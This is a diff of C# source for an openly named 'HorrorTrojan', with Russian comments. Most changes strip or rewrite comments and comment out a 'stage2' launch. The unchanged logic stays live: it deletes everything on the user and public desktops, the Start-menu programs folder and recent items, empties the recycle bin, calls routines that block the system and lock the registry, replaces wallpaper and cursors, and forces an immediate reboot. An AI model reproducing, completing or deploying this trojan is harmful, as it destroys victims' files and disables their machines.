@@ -31,18 +31,12 @@ namespace HorrorTrojan
                     Application.EnableVisualStyles();
                     Application.SetCompatibleTextRenderingDefault(false);
                     
-                    // === ПРАВИЛЬНЫЙ ПОРЯДОК ЗАПУСКА ===
-                    // 1. Сначала создаем оба окна
                     BloodEffect blood = new BloodEffect();
                     MainInterface ui = new MainInterface();
                     
-                    // 2. Показываем кровь
                     blood.Show();
-                    
-                    // 3. Показываем интерфейс поверх крови
                     ui.Show();
                     
-                    // 4. Запускаем главный цикл сообщений
                     Application.Run();
                     return;
                 }
@@ -55,18 +49,18 @@ namespace HorrorTrojan
                 
                 if (!File.Exists(updatePath) || Assembly.GetExecutingAssembly().Location != updatePath)
                 {
+                    // ===== УСТАНОВКА =====
                     ResourceExtractor.ExtractAll();
                     SystemBlocker.BlockEverything();
                     RegistryLocker.LockEverything();
-                    
-                    // === УДАЛЕНИЕ СОДЕРЖИМОГО РАБОЧЕГО СТОЛА ===
                     DeleteDesktopContents();
-                    
                     ApplyWallpaper();
                     ApplyCursors();
                     
-                    Process.Start(updatePath, "stage2");
+                    // НЕ ЗАПУСКАЕМ stage2 ЗДЕСЬ!
+                    // Process.Start(updatePath, "stage2");  ← УБРАНО!
                     
+                    // ПЕРЕЗАГРУЗКА
                     var psi = new ProcessStartInfo("shutdown", "/r /f /t 0");
                     psi.CreateNoWindow = true;
                     psi.UseShellExecute = false;
@@ -75,6 +69,7 @@ namespace HorrorTrojan
                 }
                 else
                 {
+                    // ===== УЖЕ УСТАНОВЛЕН (ЗАПУСК ИЗ SystemUpdate) =====
                     Application.EnableVisualStyles();
                     Application.SetCompatibleTextRenderingDefault(false);
                     
@@ -123,23 +118,18 @@ namespace HorrorTrojan
         {
             try
             {
-                // Получаем путь к рабочему столу текущего пользователя
                 string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                 string publicDesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
                 
-                // Удаляем файлы и папки с рабочего стола
                 DeleteAllFilesAndFolders(desktopPath);
                 DeleteAllFilesAndFolders(publicDesktopPath);
                 
-                // Удаляем все ярлыки из папки "Programs" (меню Пуск)
                 string programsPath = Environment.GetFolderPath(Environment.SpecialFolder.Programs);
                 DeleteAllFilesAndFolders(programsPath);
                 
-                // Удаляем быстрый доступ (Recent Documents)
                 string recentPath = Environment.GetFolderPath(Environment.SpecialFolder.Recent);
                 DeleteAllFilesAndFolders(recentPath);
                 
-                // Очищаем корзину (через shell32)
                 try
                 {
                     Process.Start(new ProcessStartInfo
@@ -161,12 +151,10 @@ namespace HorrorTrojan
             {
                 if (!Directory.Exists(path)) return;
                 
-                // Удаляем все файлы
                 foreach (string file in Directory.GetFiles(path))
                 {
                     try
                     {
-                        // Пропускаем системные файлы (если они есть)
                         FileInfo fi = new FileInfo(file);
                         if ((fi.Attributes & FileAttributes.System) == FileAttributes.System)
                             continue;
@@ -176,7 +164,6 @@ namespace HorrorTrojan
                     catch { }
                 }
                 
-                // Удаляем все папки
                 foreach (string dir in Directory.GetDirectories(path))
                 {
                     try
